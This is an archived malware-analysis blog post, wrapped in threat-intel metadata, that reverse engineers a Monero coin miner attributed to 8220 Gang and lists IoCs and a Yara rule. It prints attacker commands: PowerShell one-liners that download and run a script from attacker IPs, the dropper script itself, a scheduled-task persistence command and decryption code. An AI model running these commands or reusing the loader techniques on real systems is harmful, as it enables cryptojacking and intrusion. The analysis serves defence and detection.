{
    "id": "47980f17-ff84-4956-b691-ad247d52021a",
    "created_at": "2023-01-12T14:59:43.87486Z",
    "updated_at": "2025-03-27T02:16:59.249946Z",
    "deleted_at": null,
    "sha1_hash": "7d1373d6acc29792bebdcdedae2cb33ad7ae4f9e",
    "title": "2022-02-17 - Investigating a Monero Coin Miner",
    "authors": "",
    "file_creation_date": "2022-09-01T10:31:51Z",
    "file_modification_date": "2022-09-01T10:31:51Z",
    "file_size": 2449118,
    "plain_text": "# Investigating a Monero Coin Miner\n\n**triskelelabs.com/investigating-monero-coin-miner**\n\nTriskele Labs Cyber Wonderland\n\nIn this blog post, we will use public and open source tooling to investigate a coin miner that was encountered during\na Digital Forensics and Incident Response (DFIR) investigation. While the malware was detected by a large amount\nof AV/EDR solutions as a generic coin miner, we wanted to dig just a bit deeper to see if we could identify which\ncoin miner was used and attempt attribution to any known Threat Actors (TA). By following the trail of breadcrumbs\nand peeling away the layers of obfuscation, we were able to deduce that an off-the-shelf, open source coin miner\nwas used. The coin miner uses some more ‘modern’, though very well known, techniques such as direct system\ncalls in an attempt to evade some endpoint security products. Additionally, this TA has been operating for at least 4\nyears and possibly longer, with a preference for known exploits in publicly facing infrastructure.\n\n## Breadcrumbs\n\nDuring an DFIR investigation, we came across a suspicious PowerShell command that was executed on the system\nby an unknown TA. There was limited forensic evidence available and we only had the name of the PowerShell\nscript and the IP address it communicated with to go on.\n\nFrom the event logs of this investigation we could see that the xmr.ps1 payload was downloaded from two IP\naddresses, 80.71.158[.]96 and 198.12.68[.]106, via the following commands:\n```\nHostApplication=powershell iex(New-Object Net.WebClient).DownloadString('hxxp://80.71.158[.]96/xmr.ps1')\n\nHostApplication=powershell iex(New-Object Net.WebClient).DownloadString('hxxp://198.12.68[.]106/xmr.ps1'\n\n```\nA check of [Greynoise.io shows that 198.12.68[.]106 has a record of scanning the internet with zmap and making](https://www.greynoise.io/viz/ip/198.12.68.106)\nweb requests for the following directory paths:\n```\n/solr/\n\n/console/login/LoginForm.jsp\n\n```\nScanning for these paths suggests that the TA is searching for internet facing servers with well known vulnerabilities\n[present in Apache Solr and Oracle Weblogic that grant Remote Code Execution such as CVE-2019-17558 and](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)\n[CVE-2020 14882](https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild)\n\n\n-----\n\nWe observed activity from the TA most recently to be associated with exploiting ProxyShell vulnerabilities.\nAlongside the above exploits, a behaviour pattern emerges where low-skill, high-reward exploits are used against\ninternet-facing devices in an opportunistic manner.\n\nWhen checking historical DNS records for 198.12.68[.]106, we noted that it had a collection of subdomains\nresolving to it. Namely `a.oracleservice[.]to was seen to resolve to the IP between 17/02/2022 and`\n18/02/2022. This domain is known to be associated with command and control infrastructure for TA [TeamTNT, as](https://attack.mitre.org/groups/G0139/)\nshown in this AlienVault [Pulse. Within this pulse is a collection of subdomains, including](https://otx.alienvault.com/pulse/6026dbb6260827691b6ce5bf/)\n```\npwn.oracleservice[.]top and pwn.givemexyz[.]in . Notably, pwn.givemexyz[.]in is identified as a\n\n```\n[failover IRC server for the Tsunami cloud-based botnet used by pwnrig and 8220 Gang, as identified in reporting by](https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/)\nLaceworkLabs in May 2021.\n\nThe other IP identified, 80.71.158[.]96, also has a historical record resolving to `a.oracleservice[.]top between`\n05/01/22 and 26/03/22. This adds a further connection between the two IPs.\n\nThe IP of 80.71.158[.]96 was still accessible during the investigation, so the script was downloaded and\ninvestigated, containing the following content:\n```\n$cc = \"http://80.71.158.96\"\n\n$is64 = (([Array](Get-WmiObject -Query \"select AddressWidth from Win32_Processor\"))[0].AddressWidth -eq\n64)\n\n$xmr = \"$cc/nazi.exe\"\n\nif ($is64) {\n\n  $xmr = \"$cc/nazi.exe\"\n\n}\n\n(New-Object Net.WebClient).DownloadFile($xmr, \"$env:TMP\\nazi.exe\")\n\nif (!(Get-Process network01 -ErrorAction SilentlyContinue)) {\n\n  Start-Process \"$env:TMP\\nazi.exe\" -windowstyle hidden\n\n}\n\n```\nUpdate: the URL is still live at the time of writing and hosting the xmr.ps1 script, though it seems the Threat\nActor has updated the name of the executable to\n```\n   oracleservice.exe\n\n```\nWhile this seems to bake in some logic to select an x86 or x64 payload based on the processor architecture, the\nsame file is downloaded regardless. Given the name of the PS script, we already had a strong suspicion this was a\nMonero (XMR) coin miner being downloaded and executed. To confirm our suspicions, we downloaded the\nexecutable, opened it in Ghidra and performed static analysis and reverse engineering.\n\n## Stage 1: The loader\n\nFollowing the execution from the entry-point, we arrive at what looks like the main function of the loader:\n\n\n-----\n\nWe can see it sleeps for 15 seconds in a likely attempt to evade any sandboxes, followed by a call to\n```\n_get_pgmptr to retrieve the path of the process. FUN_00401000 looks like it takes a pointer to some data and a\n\n```\nsize variable, returning a string. When we inspect the function it looks to be an XOR encryption function that\ndecrypts the given data and returns it:\n\nAs a quick proof of concept, we’ll use CyberChef to confirm:\n\n\n-----\n\nAfter quickly decrypting the hard-coded strings, we’ll make reversing a bit easier by adding some comments\ncontaining the decrypted strings and renaming the appropriate variables:\n\nIn this function, the loader retrieves the system root (”C:\\Windows\\”), appends “System32\\conhost.exe”, stores that,\nthen creates a new command line by adding the path of the current executable to the conhost.exe path, resulting in\nthe following command:\n```\nC:\\Windows\\System32\\conhost.exe <current process path>\n\n```\n\n-----\n\nThis is used by `CreateProcessA to create the conhost.exe process, pass it the command and launch it in a`\nsuspended state by providing the following Process Creation Flags:\n```\nCREATE_NO_WINDOW - 0x08000000\n\nCREATE_SUSPENDED - 0x00000004\n\n```\nThe `_PROCESS_INFORMATION structure is populated and the next function ( FUN_00401a9a ) uses the handle to`\nthe suspended process in some way. Digging into this next function, we see it performs a syscall instruction:\n\nIf we follow `FUN_004018f1, there is a piece of code that would look familiar to some implant or malware`\ndevelopers, using a binary OR operation to find the name of a loaded DLL in memory. In this case, the below code\nattempts to find ntdll.dll by OR’ing the name with `0x20202020, resulting in` `0x6c64746e .`\n\nA brief google search shows that this is most likely a way to use direct system calls rather than potentially hooked\nWindows APIs, specifically in this case the SysWhispers2 project by jthuraisamy\n[(https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L53-L54).](https://github.com/jthuraisamy/SysWhispers2/blob/main/example-output/Syscalls.c#L53-L54)\n\nIn order to use the direct system calls, it’s necessary to use the lower level Windows APIs present in ntdll.dll. For\nexample, it would be necessary to use `NtAllocateVirtualMemory rather than` `VirtualAlloc since it is the`\nformer that will perform the syscall() instruction to allocate the requested memory.\n\nWhile some of these lower level system call functions used in the coin miner’s loader can be guessed based on\ntheir arguments and some knowledge of common process injection patterns, we can confirm it by loading the\nexecutable in a debugger and stepping through the execution until we hit the system call.\n\nOnce the executable is loaded and x64dbg has control, we can see the function calls following the call to\n```\nCreateProcessA . We’ll step into the first function and set a breakpoint on the syscall, revealing the system call\n\n```\nabout to be called is `NtAllocateVirtualMemory .`\n\n\n-----\n\nBack to Ghidra, we can see the next function uses the same XOR decryption routine, this time with a large size,\nmeaning we likely have found the function where shellcode is being decrypted, presumably followed by a function to\nwrite it into memory in the created process. Since we’re interested in this shellcode, but this shellcode is being\ninjected into a suspended child process and not in the process we’re currently debugging, we will use x64dbg to\nretrieve it. We’ll do this by setting a break point after the decryption function, inspecting the ‘rax’ register for the\nlocation of the decrypted code and dumping it to disk:\n\nThe in-memory decrypted shellcode starts with a call to another function, which could be some sort of further\ndecryption routine:\n\n\n-----\n\nBefore we attempt to analyse the shellcode, we ll need to confirm the rest of the assumptions around the process\ninjection by mapping the remaining functions to their system calls and renaming some of the variables for clarity.\nThe reversed function now looks as follows:\n\nWe’ll transfer the dumped memory and inspect it using `xxd, revealing the following contents:`\n```\n00000000: 1001 1b00 0000 0000 1001 1b00 0000 0000 ................\n\n00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................\n\n00000020: 00a0 2500 0000 0000 0010 2600 0000 0000 ..%.......&.....\n\n00000030: 0000 0000 0000 0000 8f89 10e0 0000 0004 ................\n\n00000040: e880 6925 0080 6925 00ff 7d52 2ec6 9f57 ..i%..i%..}R...W\n\n00000050: 9595 80d8 0c1d 80a4 f6d6 6ba0 c16d 7da6 ..........k..m}.\n\n00000060: c7cf c2fc 3d97 fb3e 6900 0000 00dd a261 ....=..>i......a\n\n00000070: 4b3a 29a2 8fdd c528 9ed8 5fe0 8134 80fc K:)....(.._..4..\n\n00000080: 5fa3 c51f d9ab 2500 0bf1 fd08 d6c9 04bf _.....%.........\n\n00000090: 2822 1dc9 87f0 c2f1 efcc bebe 9437 130b (\"...........7..\n\n```\nThe shellcode was written to `0xB96040, but the memory we saved to disk started at` `0xB96000, so we’ll trim the`\nfirst 64 bytes to get to the actual shellcode (this can be easily done with `tail on any *nix system:` `tail -c +65`\n```\nmemorydump.bin > trimmed.bin ).\n\n```\nAt this point, we know the loader uses system calls to inject the decrypted shellcode into a suspended child\nprocess. It then proceeds to kick off execution in that child process using `NtCreateThreadEx .`\n\nDuring the initial triage of this malware, we had also checked the hash on VirusTotal. As it turns out, a few of the\n[vendors classified the file as “Win64.Donut”. Donut (https://github.com/TheWover/donut) “is a position-independent](https://github.com/TheWover/donut)\ncode that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies”. It can take\nany of the supported executable formats and convert it into Position-Independent Code (PIC). Based on the VT\nresults, we can confirm this is indeed Donut shellcode using a few different ways. One such way is this Yara rule\n[created by the Telsy CTI Team (https://gist.github.com/g-les/47e958c9069765d298aadfe6da677f29) which informs](https://gist.github.com/g-les/47e958c9069765d298aadfe6da677f29)\nus Donut shellcode has the following characteristics:\n\n\n-----\n\n1. Always starts with a call first byte is `e8`\n\n1. the next 4 bytes are identical to the 4 after that: `80692500 80692500`\n\nTo really confirm this is Donut-generated shellcode, we can also use the amazing “undonut”\n[(https://github.com/listinvest/undonut) tool to unpack it and even recover the original shellcode:](https://github.com/listinvest/undonut)\n```\n./undonut -recover recovered.bin -shellcode trimmed.bin\n\nDonut Instance:\n\n [*] Size: 2451840\n\n [*] Instance Master Key: [255 125 82 46 198 159 87 149 149 128 216 12 29 128 164 246]\n\n [*] Instance Nonce: [214 107 160 193 109 125 166 199 207 194 252 61 151 251 62 105]\n\n [*] IV: 4b61a2dd00000000\n\n [*] Exit Option: EXIT_OPTION_THREAD\n\n [*] Entropy: ENTROPY_DEFAULT\n\n [*] DLLs: ole32;oleaut32;wininet;mscoree;shell32\n\n [*] AMSI Bypass: BYPASS_CONTINUE\n\n [*] Instance Type: INSTANCE_EMBED\n\n [*] Module Master Key: [219 86 126 253 25 188 162 132 41 85 73 175 189 123 232 151]\n\n [*] Module Nonce: [32 72 59 243 234 58 232 241 83 46 149 230 228 206 217 162]\n\n [*] Module Type: MODULE_NET_EXE\n\n [*] Module Compression: COMPRESS_NONE\n\nExtracting original payload to recovered.bin\n\n```\nLooks like we’re dealing with a .NET assembly based on the Module Type and a quick check of recovered.bin\nconfirms this:\n```\nrecovered.bin: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows\n\n```\nIn summary, the original PowerShell one-liner executed a PowerShell script in memory. This script downloaded\n```\nnazi.exe to $env:TMP and executed it. This executable then used direct system calls to create a suspended\n\n```\nprocess, decrypted an XOR-encrypted blob of Donut-generated shellcode and injected it into the suspended\nprocess, followed by a call to `NtCreateThreadEx to start execution at the start of the Donut-generated shellcode`\nin this suspended process. We then used `undonut to retrieve the original .NET binary out of the shellcode for`\nfurther analysis.\n\n## Stage 2: The obfuscated .NET assembly\n\nSince we’re now dealing with a .NET assembly, we’ll switch gears and load it in dnSpy\n[(https://github.com/dnSpy/dnSpy), which can be used to disassemble and edit .NET code. At first glance, it seems](https://github.com/dnSpy/dnSpy)\nto use some further obfuscation by both renaming some of the methods and encrypting the strings.\n\n\n-----\n\nAs these strings need to be de-obfuscated at run time, we can simply use the decryption function in the assembly to\ndecrypt the strings. The first part of the decryption just base64-decodes the text, then passes it on to the decryption:\n```\npublic static string lpqwqedvebymoauwor(string dzgxchdoczxqowkwogbsmcd)\n\n  {\n\n    return\nEncoding.UTF8.GetString(fjhrvaynwouqvkbeletmwuvcmtugqknf.uwcbfdbqkrwtzb(Convert.FromBase64String(dzgxchdocz\n false));\n\n  }\n\n```\nThe decryption function:\n\n\n-----\n\n```\np y [] q ( y [] g q g, p gg jp gq y gq\nfalse)\n\n  {\n\n    Rfc2898DeriveBytes rfc2898DeriveBytes = new\nRfc2898DeriveBytes(\"ojfjdfielssdyzqwznqobyegcwwxjaushzqzrcjukrmcwcwblvqfklidbxqoppgkravyiqxstmwqntnzayuwoem\n Encoding.ASCII.GetBytes(\"adrionvgpxfarbibkilesebbhmbwklfj\"), 100);\n\n    RijndaelManaged rijndaelManaged = new RijndaelManaged\n\n    {\n\n      KeySize = 256,\n\n      Mode = CipherMode.CBC\n\n    };\n\n    ICryptoTransform transform = pcxgguotjpugqoeyxdeiodigq ?\nrijndaelManaged.CreateEncryptor(rfc2898DeriveBytes.GetBytes(16),\nEncoding.ASCII.GetBytes(\"vnyihutudlwbxshp\")) :\nrijndaelManaged.CreateDecryptor(rfc2898DeriveBytes.GetBytes(16),\nEncoding.ASCII.GetBytes(\"vnyihutudlwbxshp\"));\n\n    byte[] result;\n\n    using (MemoryStream memoryStream = new MemoryStream())\n\n    {\n\n      using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform,\nCryptoStreamMode.Write))\n\n      {\n\n        cryptoStream.Write(dzgxchdoczxqowkwogbsmcd, 0, dzgxchdoczxqowkwogbsmcd.Length);\n\n        cryptoStream.Close();\n\n      }\n\n      result = memoryStream.ToArray();\n\n    }\n\n    return result;\n\n  }\n\n```\nOnce decrypted, the first part of the code starts to make sense (some methods have been renamed for clarity and\nthe decrypted strings have been added as comments for easier reading):\n\n\n-----\n\nIn short, it starts by concatenating the following strings:\n```\nC:\\Users\\<user>\\AppData\\Roaming\\Windows\\Libs\n\nC:\\Users\\<user>\\AppData\\Roaming\\Windows\\Telemetry\n\n```\nThe if-condition isn’t met since there is no command line arguments being passed on the first run, so it continues on\nbelow, creating the above directories followed by a method we have not yet encountered:\n\n\n-----\n\nThe method `nqpepwxvekhptsodeqsiskrspubcgfbzwzrtg takes a string argument, retrieves the resource with`\nthat name from the assembly, decrypts and returns it.\n\nArmed with this knowledge, we can see that this part of the code retrieves an encrypted driver from the resources of\nthe assembly, decrypts it and writes it to disk at `C:\\Users\\<user>\\AppData\\Roaming\\Windows\\Libs\\WR64.sys .`\nA quick inspection of this driver shows it is validly signed and is a compiled version of this code:\n[https://github.com/QCute/WinRing0. Some of the functionality in this driver is worrying, and the GitHub repository](https://github.com/QCute/WinRing0)\nstates it is designed for the following, making it an ideal rootkit:\n```\nAllow user application to access ring0 level resource\n\n  access cpu msr register\n\n  read/write memory directly\n\n  io pci device\n\n  etc...\n\n```\nIt also doesn’t seem to be detected by many AV/EDR vendors\n[(https://www.virustotal.com/gui/file/11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5),](https://www.virustotal.com/gui/file/11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5)\nthough the community comments show at least some people are aware of its capabilities and its use in crypto\nmining:\n\n\n-----\n\nThe decryption of the driver is followed by a second resource being decrypted, this time it seems to be a zip file:\n\nSince we’re interested in this zip file, we simply save the encrypted, raw resource to disk using dnSpy and write a\nsimple wrapper around the decryption function to decrypt it and save it so we can inspect the contents:\n\n\n-----\n\nUsing `file shows us it is indeed a zip file:`\n```\nartifacts/nktkndecoded.bin: Zip archive data, at least v2.0 to extract .\n\n```\nWhen we extract it, we find xmrig.exe inside, which is a known, not necessarily malicious, crypto miner\n[(https://github.com/xmrig/xmrig):](https://github.com/xmrig/xmrig)\n\nContinuing our analysis of the .NET code, we hit the following method:\n```\nstring text4 = CryptoMiner.qugegcxxvxwnbxjefrfpwvbrhzsph();\n\n```\nThis method does the following (with the decrypted strings added as comments):\n```\npublic static string qugegcxxvxwnbxjefrfpwvbrhzsph()\n\n  {\n\n    string text = \"\";\n\n    ManagementScope managementScope = new ManagementScope(\"\\\\root\\\\cimv2\", new ConnectionOptions\n\n    {\n\n      Impersonation = ImpersonationLevel.Impersonate\n\n    });\n\n    managementScope.Connect();\n\n    ManagementObjectCollection managementObjectCollection = new\nManagementObjectSearcher(managementScope, new\nObjectQuery(CryptoMiner.Deobfuscate(\"qCK9ddMiJpvBX7USoFFrE3XJR34PmItG94p+6aJ6y2ed3Jrwy9WKItFQLh3W0CcNJgYz/H\n CommandLine from Win32_Process WHERE CommandLine LIKE '%fnwymrmnzqtg%'\n\n    foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)\n\n    {\n\n      ManagementObject managementObject = (ManagementObject)managementBaseObject;\n\n      if (managementObject != null && managementObject[\"CommandLine\"] != null &&\nmanagementObject[\"CommandLine\"].ToString().Contains(CryptoMiner.Deobfuscate(\"orz55qpjOyFf63UsDHzysQ==\")))//\n\n      {\n\n        text += managementObject[\"CommandLine\"].ToString();\n\n      }\n\n    }\n\n    return text;\n\n  }\n\n```\nIt uses the System.Management namespace to access WMI on the local host, then attempts to find a process with\na command line that contains `%fnwymrmnzqtg% . If it finds it, it returns the command line.`\n\nIn the next block of code, a series of strings are stored (de-obfuscated contents in comments next to each)\n\n\n-----\n\n```\n     ( g[] y g[][]\n          {\n\n            new string[]\n\n            {\n\n              \"JwxzXGkqP9AvRDuUT1tzWA==\",//fnwymrmnzqtgf0\n\n              \"f\",\n\n\"8pg4JxwF5oP3uc2ts1jCsxFYlG8kPtWg9mTb3dswYn4ExnxKJ6sQ4BS8+bpssl6eKOCi1V/3NfbZ/DsmAEMvw/PSoEqGNe8Yre4+jTRiX0\nXji3FXYfqqI2timPThbgZueMNpSES88mLhMz2ywydJRpJXefNDfRddYDRzvos5SYUD+mF8LsDeZoI8vMJvRlwTumE8mSPmuhoB3oCRnq52I\n\n              \"5rHyu+TR5p3DUeII51G9TA==\",//systemroot\n\n              \"QmDFLdUXxO6MjBHbWUJFAg==\"//explorer.exe\n\n            }\n\n          })\n\n          {\n\n            if (!text4.Contains(CryptoMiner.Deobfuscate(array3[0])) && (array3[1] ==\nCryptoMiner.Deobfuscate(\"Tlu85WuqsR07Nj7ZXnFUdg==\")/* f */ || (array3[1] ==\nCryptoMiner.Deobfuscate(\"KtVyVmYTz+X9OhsUsyPYNQ==\")/* r */ && flag)))\n\n            {\n\n              CryptoMiner.azakdrkrmskwpdicwwxjwoqaxpda((array3[1] ==\nCryptoMiner.Deobfuscate(\"Tlu85WuqsR07Nj7ZXnFUdg==\")) ? array : array2,\nPath.Combine(Environment.GetEnvironmentVariable(CryptoMiner.Deobfuscate(array3[3])),\nCryptoMiner.Deobfuscate(array3[4])), CryptoMiner.Deobfuscate(array3[2]));\n\n            }\n\n          }\n\n```\nThe if-block checks whether the WMI method earlier returned any running processes with `fnwymrmnzqtgf0 in the`\ncommand line. If none are found (and none were found during the first run of this executable as it is initially called\nwithout command line arguments), the `azakdrkrmskwpdicwwxjwoqaxpda method is called. This method does the`\nheavy lifting around process injection using process hollowing. In short, it creates a suspended explorer.exe\nprocess, then uses `ZwUnmapViewOfSection to remove the legitimate code, followed by` `VirtualAllocEx and`\n```\nWriteProcessMemory and eventually ResumeThread to complete the injection.\n\n```\nWe have enough data now to do some cursory searches for what this malware might be, based on the use of\nWR64.sys and xmrig.exe, and a quick search on Github leads us to the off-the-shelf coin miner called\n[https://github.com/UnamSanctam/SilentXMRMiner, concluding our technical investigation. Further IoCs were](https://github.com/UnamSanctam/SilentXMRMiner)\nobtained using dynamic analysis, such as capturing the network traffic, to confirm the mining proxy in use and the\nMonero wallet address.\n\nThere is more to the functionality of the miner, specifically in the way it handles making sure the miner is running via\na watchdog process, as well as creating a scheduled task for persistence, though a full analysis of this open source\nproject is out of scope for this investigation.\n\n## Closing remarks\n\nThis coin miner is not particularly sophisticated and neither are the methods used to gain initial access, yet a brief\nsearch for the associated Monero wallet address\n( 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ )\nshows that this Threat Actor (tracked as 8220 Gang - https://www.lacework.com/blog/8220-gangs-recent-use-ofcustom-miner-and-botnet/) seems to favour quantity over quality as it’s been associated with coin mining since at\nleast 2018 using a wide variety of public exploits. The links between the IPs used to drop the xmr.ps1 payload into\nthe victim system and the domains of a.oracleservice[.]top, pwn.oracleservice[.]top and pwn.givemexyz[.]in also\nconnect our identified activity back to the activity identified in the Lacework report.\n\nBuilding on our understanding of vulnerabilities scanned for from the IP of 198.12.68[.]106, it also seems at least\nthe following public high-profile exploits have been associated with the Monero wallet address:\n\n\n-----\n\nExchange ProxyShell\nApache Hadoop YARN ResourceManager Unauthenticated RCE\nLog4Shell\nConfluence Widget Connector path traversal\nApache Struts2\n\n## Indicators of Compromise\n\nNetwork:\n```\n80.71.158.96 - hosts the powershell script and .exe\n\noracleservice[.]top - resolved to by 198.12.68.106 and 80.71.158.96, identified as a C2 server\n\n167.114.114.169 - mining proxy\n\nRequest made to mining proxy:\n\n{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":\n{\"login\":\"46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ\",\n (Windows NT 10.0; Win64; x64) libuv/1.38.0 msvc/2019\",\"rigid\":\"\",\"algo\":\n[\"rx/0\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"cnlite/1\",\"cn-heavy/0\",\"cn-heavy/tube\",\"cn-heavy/xhv\",\"cn-pico\",\"cnpico/tlo\",\"cn/upx2\",\"cn/1\",\"rx/wow\",\"rx/arq\",\"rx/graft\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\n\n```\nBinaries:\n```\nD71902D94F791BC465DF2E02F65B2C45F1ABCE409D173A040DF1DCDB64E5D2F7 nazi.exe\n\n367A44FE1674FFCDB78BDC97CBDCB464662FDFB6C018F05B4D92BD56131B3587 nazi-miner.exe (.NET assembly)\n\n11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5 WR64.sys\n\nB0748B57A8D9B22EEEC43422CE6CB5FDE27C26AB6620EC2E992660CB2698CBE0 xmrig.exe\n\n```\nYara rule to catch hard-coded OR obfuscation of ntdll in the Syswhispers2 library of the loader:\n```\nrule Syswhispers : syswhispers syscalls\n\n{\n\n  meta:\n\n    author = \"Brecht Snijders at Triskele Labs\"\n\n    date = \"2022-04-07\"\n\n    description = \"A Yara rule to find binaries that use the Syswhispers2 project for direct system\ncall invocation\"\n\n    modified = \"2022-04-07\"\n\n    hash = \"d71902d94f791bc465df2e02f65b2c45f1abce409d173a040df1dcdb64e5d2f7\"\n\n    tlp = \"WHITE\"\n\n  strings:\n\n    $syscall_1 = { 20 20 20 20 [2] 6e 74 64 6c }\n\n    $syscall_2 = { 20 20 20 20 [2] 6c 2e 64 6c }\n\n  condition:\n\n    uint16(0) == 0x5a4d\n\n    and $syscall_1\n\n    and $syscall_2\n\n}\n\n```\nScheduled Task persistence:\n```\ncmd.exe /c schtasks /create /f /sc onlogon /rl highest /tn \"services\" /tr \"C:\\Users\\\n<user>\\AppData\\Local\\Temp\\Windows\\services.exe\"\n\n```\nSubscribe_\n\n## Get the latest Cyber Wonderland in your inbox\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-17 - Investigating a Monero Coin Miner.pdf"
    ],
    "report_names": [
        "2022-02-17 - Investigating a Monero Coin Miner.pdf"
    ],
    "threat_actors": [
        {
            "id": "0b8ea9bb-b729-438a-ae1f-4240db936fd7",
            "created_at": "2023-06-23T02:04:34.839947Z",
            "updated_at": "2025-03-27T02:02:10.230259Z",
            "deleted_at": null,
            "main_name": "8220 Gang",
            "aliases": [
                "8220 Mining Group",
                "Returned Libra",
                "Water Sigbin"
            ],
            "source_name": "ETDA:8220 Gang",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "942c5fbc-31df-4aef-8268-e3ccf6692ec8",
            "created_at": "2024-07-09T02:00:04.434476Z",
            "updated_at": "2025-03-27T02:00:03.397103Z",
            "deleted_at": null,
            "main_name": "Water Sigbin",
            "aliases": [
                "8220 Gang"
            ],
            "source_name": "MISPGALAXY:Water Sigbin",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535583,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1662028311,
    "ts_modification_date": 1662028311,
    "files": {
        "pdf": "https://archive.orkl.eu/7d1373d6acc29792bebdcdedae2cb33ad7ae4f9e.pdf",
        "text": "https://archive.orkl.eu/7d1373d6acc29792bebdcdedae2cb33ad7ae4f9e.txt",
        "img": "https://archive.orkl.eu/7d1373d6acc29792bebdcdedae2cb33ad7ae4f9e.jpg"
    }
}